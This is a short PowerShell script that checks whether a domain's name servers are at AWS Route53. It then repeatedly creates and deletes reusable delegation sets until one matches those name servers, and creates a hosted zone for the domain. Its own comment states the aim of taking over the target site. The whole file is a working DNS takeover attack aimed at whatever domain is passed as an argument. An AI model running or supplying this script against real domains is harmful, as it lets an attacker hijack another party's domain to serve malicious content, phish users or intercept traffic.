# Try and take over a target site whose name server records are in AWS Delegation Sets (DS) in Route53
$myNameServer = 8.8.8.8
# First argument is the endpoint.
$targetsite = $args[0]
if ( $null -eq $targetsite -or $targetsite.Length -eq 0 ) { throw "Failed - no argument supplied" }
$servers = ( Resolve-DnsName -Type NS $targetsite -Server $myNameServer | Where-Object section -eq 'Answer' ).NameHost
if ( $servers -notmatch 'awsdns' ) { throw 'Failed servers aren''t at AWS' }

# Caller reference requires to be different each time. 5 random letters, plus a number, is what I choose.
$randprefix = -join ( 'a'..'z' | Get-Random -Count 5 )

$nomatch = $true
$crumb = 1
while ($nomatch) {
  Write-Progress "Try number $crumb"
  $q = ( aws route53 create-reusable-delegation-set --caller-reference $randprefix$crumb | ConvertFrom-Json )
  $qq = Compare-Object $q.DelegationSet.NameServers $servers -IncludeEqual -ExcludeDifferent
  if ( $qq.Count -ne 0 ) {
    break
  }
  aws route53 delete-reusable-delegation-set --id $q.DelegationSet.Id
  $crumb++
}
aws route53 create-hosted-zone --name $targetsite --caller-reference $($randprefix)Success --delegation-set-id $q.DelegationSet.Id
